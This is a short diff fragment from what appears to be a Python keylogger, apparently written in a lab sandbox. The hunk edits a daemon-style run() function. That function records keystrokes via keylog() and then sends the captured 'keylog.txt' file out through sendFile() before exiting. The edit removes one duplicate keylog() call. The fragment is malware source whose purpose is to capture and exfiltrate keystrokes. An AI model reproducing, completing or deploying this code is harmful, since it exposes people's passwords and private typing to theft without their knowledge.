@@ -216,9 +216,7 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
     keylog("/home/lab/sandbox/keylogger.py")
     sys.stdout.flush() 
     sys.stderr.flush()
-    
-    keylog()
-    
+ 
     sendFile("", keyLoc,  'keylog.txt')
     os._exit(0)
     
